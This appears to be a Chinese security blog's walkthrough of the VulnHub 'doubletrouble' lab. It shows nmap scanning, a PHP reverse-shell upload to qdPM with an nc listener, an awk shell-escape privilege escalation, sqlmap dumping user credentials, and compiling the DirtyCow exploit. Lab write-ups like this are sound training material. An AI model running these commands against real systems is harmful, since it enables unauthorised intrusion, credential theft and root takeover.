@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vulnhub靶机doubletrouble - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
+</head>
+<body>
+<div class="mk-scanline"></div>
+<div class="mk-container">
+
+<div class="mk-brand fade-up">
+  <span class="mk-mark"></span>
+  <span class="mk-wordmark">// HIMOBRINE</span>
+</div>
+
+<div id="mkNavSentinel"></div>
+
+<div class="mk-nav-wrap" id="mkNavWrap">
+  <nav class="mk-nav">
+    <a href="../index.html" class="mk-nav-link">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析" class="mk-nav-link">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具" class="mk-nav-link">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记" class="mk-nav-link">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向" class="mk-nav-link">逆向</a>
+    <a href="../tags/list.html?tag=调试" class="mk-nav-link">调试</a>
+    <a href="../tags/list.html" class="mk-nav-link">标签归档</a>
+  </nav>
+</div>
+
+<a href="../index.html" class="mk-back-link">[ &larr; ] BACK TO HOME</a>
+
+<article class="mk-bento-tile">
+  <div class="mk-post-date">2023 // 10 / 06</div>
+  <div class="mk-post-title">vulnhub靶机doubletrouble</div>
+  <div class="mk-post-tags">
+    <a href="../tags/list.html?tag=vulnhub" class="mk-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="mk-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
+  </div>
+
+  <div class="mk-post-content" >
+
+    <nav class="mk-toc">
+      <span class="mk-toc-title">// 目录</span>
+      <ul>
+        <li class="toc-h4"><a href="#part1">Part 1：第一台靶机</a></li>
+        <li class="toc-h5"><a href="#p1-discovery">主机发现</a></li>
+        <li class="toc-h5"><a href="#p1-portscan">端口扫描</a></li>
+        <li class="toc-h5"><a href="#p1-service">服务扫描</a></li>
+        <li class="toc-h5"><a href="#p1-web">Web 信息收集</a></li>
+        <li class="toc-h5"><a href="#p1-steghide">图片隐写</a></li>
+        <li class="toc-h5"><a href="#p1-qdpm">qdPM 后台利用</a></li>
+        <li class="toc-h5"><a href="#p1-shell">反弹 Shell</a></li>
+        <li class="toc-h5"><a href="#p1-awk">awk 提权</a></li>
+        <li class="toc-h5"><a href="#p1-ova">发现第二台靶机</a></li>
+        <li class="toc-h4"><a href="#part2">Part 2：第二台靶机</a></li>
+        <li class="toc-h5"><a href="#p2-discovery">主机发现</a></li>
+        <li class="toc-h5"><a href="#p2-portscan">端口扫描</a></li>
+        <li class="toc-h5"><a href="#p2-sql">SQL 注入</a></li>
+        <li class="toc-h5"><a href="#p2-ssh">SSH 登录</a></li>
+        <li class="toc-h5"><a href="#p2-dirtycow">DirtyCow 提权</a></li>
+      </ul>
+    </nav>
+
+    <p>下载地址：<a href="https://www.vulnhub.com/entry/doubletrouble-1,743/" target="_blank">doubletrouble: 1 ~ VulnHub</a></p>
+
+    <h4 id="part1">Part 1：第一台靶机</h4>
+
+    <h5 id="p1-discovery">主机发现</h5>
+    <pre><code>arp-scan -l</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image001.png" alt="arp-scan 结果"></p>
+
+    <h5 id="p1-portscan">端口扫描</h5>
+    <pre><code>nmap --min-rate 1000 -p- 192.168.21.151</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image002.png" alt="nmap 全端口扫描"></p>
+
+    <h5 id="p1-service">服务扫描</h5>
+    <pre><code>nmap -sV -sT -O -p22,80 192.168.21.151</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image003.png" alt="nmap 服务扫描"></p>
+    <pre><code>nmap --script=vuln -p22,80 192.168.21.151</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image004.png" alt="nmap 漏洞扫描"></p>
+
+    <h5 id="p1-web">Web 信息收集</h5>
+    <p>访问 Web 页面，发现使用的是 qdPM（项目管理工具）：</p>
+    <p><img loading="lazy" src="../assets/dt_image005.png" alt="Web 页面"></p>
+    <p>查找 qdPM 漏洞：</p>
+    <p><img loading="lazy" src="../assets/dt_image006.png" alt="searchsploit"></p>
+    <pre><code>dirsearch -u http://192.168.21.151</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image007.png" alt="dirsearch"></p>
+    <p>发现非模板文件夹：</p>
+    <p><img loading="lazy" src="../assets/dt_image008.png" alt="目录 1"></p>
+    <p><img loading="lazy" src="../assets/dt_image009.png" alt="目录 2"></p>
+    <p>发现一张图片，下载下来：</p>
+    <p><img loading="lazy" src="../assets/dt_image010.png" alt="下载图片"></p>
+
+    <h5 id="p1-steghide">图片隐写</h5>
+    <p>基础检查：</p>
+    <p><img loading="lazy" src="../assets/dt_image011.png" alt="文件检查"></p>
+    <p><img loading="lazy" src="../assets/dt_image012.png" alt="文件信息"></p>
+    <p>使用新工具分析：</p>
+    <p><img loading="lazy" src="../assets/dt_image013.png" alt="分析工具"></p>
+    <p><img loading="lazy" src="../assets/dt_image014.png" alt="需要密码"></p>
+    <p>需要密码，尝试爆破：</p>
+    <p><img loading="lazy" src="../assets/dt_image015.png" alt="爆破 1"></p>
+    <p><img loading="lazy" src="../assets/dt_image016.png" alt="爆破 2"></p>
+    <p><img loading="lazy" src="../assets/dt_image017.png" alt="爆破成功"></p>
+    <p>密码搞定，查看提取的文件：</p>
+    <p><img loading="lazy" src="../assets/dt_image018.png" alt="提取文件"></p>
+    <p>得到 qdPM 的登录凭证：</p>
+    <p><img loading="lazy" src="../assets/dt_image019.png" alt="凭证"></p>
+
+    <h5 id="p1-qdpm">qdPM 后台利用</h5>
+    <p>登录后发现文件上传点：</p>
+    <p><img loading="lazy" src="../assets/dt_image020.png" alt="文件上传"></p>
+    <p>准备 php-reverse-shell，上传：</p>
+    <p><img loading="lazy" src="../assets/dt_image021.png" alt="上传"></p>
+    <p>访问上传的文件：</p>
+    <p><img loading="lazy" src="../assets/dt_image022.png" alt="访问"></p>
+    <p><img loading="lazy" src="../assets/dt_image023.png" alt="访问结果"></p>
+    <pre><code>nc -lvnp 1234</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image024.png" alt="监听"></p>
+    <p>成功反弹：</p>
+    <p><img loading="lazy" src="../assets/dt_image025.png" alt="反弹成功"></p>
+    <pre><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image026.png" alt="TTY"></p>
+
+    <h5 id="p1-awk">awk 提权</h5>
+    <p>信息收集：</p>
+    <p><img loading="lazy" src="../assets/dt_image027.png" alt="信息收集 1"></p>
+    <p><img loading="lazy" src="../assets/dt_image028.png" alt="信息收集 2"></p>
+    <p><img loading="lazy" src="../assets/dt_image029.png" alt="信息收集 3"></p>
+    <p>发现 awk 以 root 运行，去 GTFOBins 查找利用方法：</p>
+    <p><img loading="lazy" src="../assets/dt_image030.png" alt="GTFOBins 1"></p>
+    <p><img loading="lazy" src="../assets/dt_image031.png" alt="GTFOBins 2"></p>
+    <p><img loading="lazy" src="../assets/dt_image032.png" alt="GTFOBins 3"></p>
+    <pre><code>awk 'BEGIN {system("/bin/sh")}'</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image033.png" alt="awk 提权"></p>
+    <p>拿下 root 权限。</p>
+
+    <h5 id="p1-ova">发现第二台靶机</h5>
+    <p>发现 /root 下不是 flag 而是一个 ova 文件：</p>
+    <p><img loading="lazy" src="../assets/dt_image034.png" alt="ova 文件"></p>
+    <p>在靶机内开启 HTTP 服务下载 ova：</p>
+    <p><img loading="lazy" src="../assets/dt_image035.png" alt="HTTP 服务"></p>
+    <p>导入第二台靶机，开始 Part 2。</p>
+
+    <h4 id="part2">Part 2：第二台靶机</h4>
+
+    <h5 id="p2-discovery">主机发现</h5>
+    <pre><code>arp-scan -l</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image036.png" alt="arp-scan"></p>
+    <p>目标：192.168.21.162</p>
+
+    <h5 id="p2-portscan">端口扫描</h5>
+    <pre><code>nmap --min-rate 1000 -p- 192.168.21.162</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image037.png" alt="nmap"></p>
+    <pre><code>nmap -sV -sT -O -p22,80 192.168.21.162</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image038.png" alt="服务扫描"></p>
+    <pre><code>nmap --script=vuln -p22,80 192.168.21.162</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image039.png" alt="漏洞扫描"></p>
+    <p>Web 页面：</p>
+    <p><img loading="lazy" src="../assets/dt_image040.png" alt="Web"></p>
+
+    <h5 id="p2-sql">SQL 注入</h5>
+    <p>手工测试 SQL 注入：</p>
+    <p><img loading="lazy" src="../assets/dt_image041.png" alt="SQL 测试"></p>
+    <p>确认存在注入，使用 sqlmap 自动化脱库：</p>
+    <pre><code>sqlmap -u http://192.168.21.162/index.php --batch --forms -dbs</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image042.png" alt="sqlmap 数据库"></p>
+    <pre><code>sqlmap -u http://192.168.21.162/index.php --batch --forms -D doubletrouble --tables</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image043.png" alt="sqlmap 表"></p>
+    <pre><code>sqlmap -u http://192.168.21.162/index.php --batch --forms -D doubletrouble -T users --columns</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image044.png" alt="sqlmap 列"></p>
+    <pre><code>sqlmap -u http://192.168.21.162/index.php --batch --forms -D doubletrouble -T users -C username,password --dump</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image045.png" alt="sqlmap 脱库"></p>
+
+    <h5 id="p2-ssh">SSH 登录</h5>
+    <p>使用获取的凭证 SSH 登录：</p>
+    <p><img loading="lazy" src="../assets/dt_image046.png" alt="SSH 登录"></p>
+    <p>只有一个用户登录成功：</p>
+    <p><img loading="lazy" src="../assets/dt_image047.png" alt="登录后"></p>
+
+    <h5 id="p2-dirtycow">DirtyCow 提权</h5>
+    <p>信息收集，系统是 Linux 3.2，存在 DirtyCow 漏洞：</p>
+    <p><img loading="lazy" src="../assets/dt_image048.png" alt="内核版本"></p>
+    <p>下载 DirtyCow 利用代码（40847）：</p>
+    <p><img loading="lazy" src="../assets/dt_image049.png" alt="下载 exp"></p>
+    <p>复制到桌面：</p>
+    <p><img loading="lazy" src="../assets/dt_image050.png" alt="复制"></p>
+    <p>通过 Web 下载：</p>
+    <p><img loading="lazy" src="../assets/dt_image051.png" alt="Web 下载"></p>
+    <pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</code></pre>
+    <p><img loading="lazy" src="../assets/dt_image052.png" alt="编译"></p>
+    <p>执行 40847：</p>
+    <p><img loading="lazy" src="../assets/dt_image053.png" alt="root"></p>
+    <p>切换用户，拿下 root！</p>
+
+  </div>
+</article>
+
+<footer class="mk-footer">
+  <div class="mk-footer-brand"> RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG </div>
+  <div class="mk-footer-motto">&gt; 道可道，非常道，名可名，非常名</div>
+  <div class="mk-footer-links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="mk-footer-copy">(c) 2026 // SECURITY BLOG</div></footer>
+
+<div class="mk-themedock" id="mkThemeDock">
+  <span class="mk-themedock-item active" data-theme="black">■</span>
+  <span class="mk-themedock-item" data-theme="white">□</span>
+  <span class="mk-themedock-item" data-theme="elysia">◇</span>
+  <span class="mk-themedock-item" data-theme="rei">▽</span>
+</div>
+
+<div class="mk-float-buttons">
+  <button class="mk-float-btn" id="mkThemeToggle" title="切换主题" aria-label="切换主题">■</button>
+  <button class="mk-float-btn" id="mkBackToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const tocLinks = document.querySelectorAll('.mk-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+document.querySelectorAll('.mk-post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'mk-code-wrap';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'mk-code-header';
+
+  const info = document.createElement('span');
+  info.className = 'mk-code-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'mk-code-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'mk-code-btn mk-code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'mk-code-btn mk-code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+<div class="mk-graph-sidebar" id="mkGraphSidebar">
+  <div class="mk-graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div><script>
+(function(){
+var gs=document.getElementById("mkGraphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var s=document.createElement("script");
+s.src="../assets/vis-network.min.js";
+s.onload=function(){
+  var d=document.createElement("script");
+  d.src="../assets/posts-data.js";
+  d.onload=function(){
+    var p=document.createElement("script");
+    p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+    document.body.appendChild(p);
+    var g=document.createElement("script");
+    g.src="../assets/graph.js";
+    document.body.appendChild(g);
+  };
+  document.body.appendChild(d);
+};
+document.body.appendChild(s);
+})();
+</script>
+<script src="../assets/common.js"></script>
+
+</body>
+</html>
